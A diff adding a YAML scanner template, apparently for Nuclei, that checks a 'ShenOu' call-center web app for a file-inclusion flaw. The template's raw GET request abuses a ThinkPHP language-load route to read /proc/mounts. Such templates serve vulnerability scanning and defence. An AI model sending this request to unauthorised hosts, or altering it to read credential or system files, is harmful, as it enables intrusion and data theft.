@@ -1,0 +1,26 @@
+id: ShenOu-index-FielContains
+
+info:
+  name: ShenOu-index-FielContains
+  author: iSee857
+  severity: high
+  description: ShenOu-index-FielContains
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/proc/mounts HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "rootfs"
+        condition: and
+      - type: status
+        status:
+          - 500
